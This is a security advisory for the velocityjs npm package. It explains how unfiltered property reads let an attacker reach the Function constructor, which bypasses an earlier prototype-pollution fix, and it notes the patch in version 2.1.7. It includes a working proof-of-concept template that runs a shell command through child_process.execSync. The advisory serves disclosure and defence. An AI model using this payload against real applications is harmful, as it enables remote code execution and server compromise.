# [C] Velocity.js: Remote Code Execution via property-read to Function constructor (bypass of GHSA-j658-c2gf-x6pq fix)

## Summary
Severity: Critical
Advisory: GHSA-7gfh-x38p-prh3
CVE: CVE-2026-73649
CWE: CWE-94
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H (CVSS_V3)
Published: 2026-07-24
Source: https://github.com/advisories/GHSA-7gfh-x38p-prh3
Type: github-advisory

## Affected
- npm: `velocityjs` — affected >=0 <2.1.7

## Details
### Summary

Remote Code Execution (RCE) in velocityjs v2.1.6 via property-read to the Function constructor. This bypasses the fix for GHSA-j658-c2gf-x6pq ("Prototype Pollution in #set path assignment") — that advisory blocked constructor/__proto__/prototype only in the #set assignment handler (set.cjs), but property read expressions are unfiltered. Any application rendering attacker-controlled Velocity templates is vulnerable to arbitrary code execution on the server.

### Details

GHSA-j658-c2gf-x6pq added isBlockedPathKey() to dist/cjs/compile/set.cjs:35-43, which blocks __proto__, constructor, and prototype keys. However, this check only runs when the #set directive assigns a value — it validates the assignment target path, not the value expression being evaluated.
The value expression is evaluated via getReferences() in dist/cjs/compile/references.cjs:16, which calls getAttributes() at line 81. The property access at line 88-89 has no filtering:
// references.cjs:81-91
getAttributes(property, baseRef, ast) {
  if (property.type === "property") {
    return baseRef[property.id];  // ← NO BLOCK on "constructor", "prototype", etc.
  }
  ...
}
Meanwhile, set.cjs:35-43 properly blocks these keys, but only for the #set target:
// set.cjs:35-43
isBlockedPathKey(baseRef, key, isEnd) {
  if (key === PROTO_KEY) return true;          // "__proto__"
  if (key === "prototype" && typeof baseRef === "function") return true;
  return !isEnd && PROTOTYPE_CHAIN_KEYS.has(key) && !hasOwnProperty(baseRef, key);
}
The exploit chain:
1. $x.constructor → getAttributes() → {}["constructor"] → Object
2. .constructor → getAttributes() → Object["constructor"] → Function
3. ("return process.mainModule.require('child_process').execSync('whoami')") → calls Function(...) → creates a function
4. The #set assigns the result to $f, which is then rendered as $r
The #set handler validates $f as the assignment target (which passes — f is not blocked), but never inspects the right-hand expression for prototype chain traversal.

### PoC

const velocity = require('velocityjs');

const template = "#set($f=$x.constructor.constructor(\"return process.mainModule.require('child_process').execSync('whoami').toString()\"))#set($r=$f())$r";

console.log(velocity.render(template, { x: {} }));
// Output: <current OS username>
Verified on velocityjs v2.1.6, Node.js v24.15.0, Windows.

### Impact

Type: Remote Code Execution (RCE)

Any application that renders attacker-controlled Velocity templates using velocityjs is vulnerable to full server compromise. The attacker can execute arbitrary shell commands, read environment variables, access cloud credentials, and pivot to internal network resources.
The existing advisory GHSA-j658-c2gf-x6pq established the threat model: "any app rendering attacker-controlled templates." This finding demonstrates that the fix was incomplete — the #set blocking was added but property read expressions remain unfiltered, making the issue strictly worse (RCE vs prototype pollution).

### Patches

Fixed in [velocityjs 2.1.7](https://www.npmjs.com/package/velocityjs/v/2.1.7). The fix was merged in [pull request #192](https://github.com/shepherdwind/velocity.js/pull/192) and released as [v2.1.7](https://github.com/shepherdwind/velocity.js/releases/tag/v2.1.7). Users should upgrade to version 2.1.7 or later.

## References
- https://github.com/shepherdwind/velocity.js/security/advisories/GHSA-7gfh-x38p-prh3
- https://github.com/shepherdwind/velocity.js/pull/192
- https://github.com/shepherdwind/velocity.js/commit/f8e47a6c4607249b9c967d3a1ced959b4dd64dba
- https://github.com/shepherdwind/velocity.js
- https://github.com/shepherdwind/velocity.js/releases/tag/v2.1.7
